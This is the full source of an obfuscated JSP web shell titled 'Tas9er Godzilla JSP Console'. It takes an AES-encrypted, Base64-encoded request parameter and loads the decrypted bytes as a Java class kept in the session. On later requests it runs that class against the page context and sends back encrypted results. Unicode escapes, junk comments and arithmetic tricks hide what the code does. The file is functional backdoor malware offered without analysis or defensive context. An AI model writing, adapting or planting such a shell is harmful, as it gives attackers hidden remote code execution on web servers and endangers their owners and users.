Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_c6XGf = "3ca71940664e77cf";
    String govsb_2CwFAbj6f81P5 = "Tas9er";
    class govsb_UuTi5pH6mw0uXaI extends /*edusb_hGDfX*/ClassLoader {
        public govsb_UuTi5pH6mw0uXaI(ClassLoader govsb_S4ioUwKw) {
            super/*edusb_IBj3qu*/(govsb_S4ioUwKw);
        }
        public Class govsb_OmhWXCplvU(byte[] govsb_E) {
            return super./*edusb_ntaRMh5*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_mcwpPHKIxdZnc*/(govsb_E, 828546-828546, govsb_E.length);
        }
    }
    public byte[] govsb_KwXffy(byte[] govsb_lhhd1Yo4nBn, boolean govsb_19LuMB) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_mR4GOZ*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_hK = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_XcAw04nlgs2bRh*/("AES");
            govsb_hK.init(govsb_19LuMB?828546/828546:828546/828546+828546/828546,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_vV5DaQwjac57*/SecretKeySpec/*edusb_suKS2AHQHN*/(govsb_c6XGf.getBytes(), "AES"));
            return govsb_hK.doFinal/*edusb_S2xRZ1QZW5gSDR*/(govsb_lhhd1Yo4nBn);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_LoXtsJyDj = java.util.Base64./*edusb_r86uVX*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_YNeXtqsk9qW*/decode(request.getParameter(govsb_2CwFAbj6f81P5));
        govsb_LoXtsJyDj = govsb_KwXffy(govsb_LoXtsJyDj,false);
        if (session.getAttribute/*edusb_FI0scv*/("payload") == null) {
            session.setAttribute("payload", new govsb_UuTi5pH6mw0uXaI(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_umb*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_MdpzNi0rIFLLc*/.govsb_OmhWXCplvU(govsb_LoXtsJyDj));
        } else {
            request.setAttribute("parameters", govsb_LoXtsJyDj);
            java.io.ByteArrayOutputStream govsb_regnpn = new java.io./*edusb_Us99opUlpCw*/ByteArrayOutputStream();
            Object govsb_Bk2cbzrjYdXCq8t = /*edusb_4Ep0HkjKPT*/((Class) session.getAttribute("payload"))./*edusb_1*//*edusb_9Leag*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_ao*/;
            govsb_Bk2cbzrjYdXCq8t.equals(govsb_regnpn);
            govsb_Bk2cbzrjYdXCq8t.equals(pageContext);
            response.getWriter().write("D851EDAE65D6483FC86ACCB2C3194A72".substring(828546-828546, 16));
            govsb_Bk2cbzrjYdXCq8t.toString();
            response.getWriter().write(java.util.Base64/*edusb_fU*/.getEncoder()/*edusb_EBG0Ru*/.encodeToString(govsb_KwXffy(govsb_regnpn.toByteArray(),true)));
            response.getWriter().write("D851EDAE65D6483FC86ACCB2C3194A72".substring(16));
        }
    } catch (Exception e) {
    }
%>